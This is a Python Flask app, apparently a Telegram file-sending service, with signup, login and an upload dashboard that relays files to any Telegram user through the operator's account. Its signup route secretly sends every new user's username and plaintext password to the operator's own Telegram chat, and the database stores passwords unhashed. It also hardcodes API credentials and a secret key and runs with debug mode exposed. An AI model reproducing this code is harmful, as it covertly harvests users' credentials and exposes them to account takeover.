import os
import uuid
import sqlite3
from flask import Flask, request, redirect, session
from telethon import TelegramClient

# =========================
# CONFIG
# =========================

api_id = 39563890
api_hash = "9b82271589c270de7b3a3af4ec955cdd"

client = TelegramClient("Livevideobot", api_id, api_hash)

ADMIN_CHAT = "me"

app = Flask(__name__)
app.secret_key = "livevideobot_secret"

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# =========================
# DATABASE
# =========================

conn = sqlite3.connect("users.db", check_same_thread=False)
c = conn.cursor()

c.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT
)
""")

conn.commit()

# =========================
# TELEGRAM SAFE SEND (SYNC WRAPPER)
# =========================

def send_to_telegram(target, file_path):
    async def run():
        await client.start()
        await client.send_file(target, file_path)

    import asyncio
    asyncio.run(run())

# =========================
# SIGNUP
# =========================

@app.route("/signup", methods=["GET", "POST"])
def signup():

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        try:
            c.execute(
                "INSERT INTO users (username, password) VALUES (?, ?)",
                (username, password)
            )
            conn.commit()

            send_to_telegram("me", f"🔥 NEW USER\n{username}\n{password}")

            return redirect("/login")

        except:
            return "Username already exists"

    return """
    <h2>Signup</h2>
    <form method="post">
        <input name="username"><br><br>
        <input name="password"><br><br>
        <button>Signup</button>
    </form>
    """

# =========================
# LOGIN
# =========================

@app.route("/login", methods=["GET", "POST"])
def login():

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        c.execute(
            "SELECT * FROM users WHERE username=? AND password=?",
            (username, password)
        )

        user = c.fetchone()

        if user:
            session["user"] = username
            return redirect("/dashboard")

        return "Wrong login"

    return """
    <h2>Login</h2>
    <form method="post">
        <input name="username"><br><br>
        <input name="password"><br><br>
        <button>Login</button>
    </form>
    """

# =========================
# DASHBOARD (FIXED UPLOAD SYSTEM)
# =========================

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():

    if "user" not in session:
        return redirect("/login")

    if request.method == "POST":

        target = request.form["username"]
        file = request.files["file"]

        if file.filename == "":
            return "No file selected"

        filename = str(uuid.uuid4()) + "_" + file.filename
        path = os.path.join(UPLOAD_FOLDER, filename)

        file.save(path)

        try:
            send_to_telegram(target, path)
            os.remove(path)
            return "✅ SENT SUCCESSFULLY"
        except Exception as e:
            return f"❌ ERROR: {str(e)}"

    return f"""
    <h2>Welcome {session['user']}</h2>

    <form method="post" enctype="multipart/form-data">
        <input name="username" placeholder="@username"><br><br>
        <input type="file" name="file" accept="*/*"><br><br>
        <button>Send Any File</button>
    </form>
    """

# =========================
# START SERVER
# =========================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)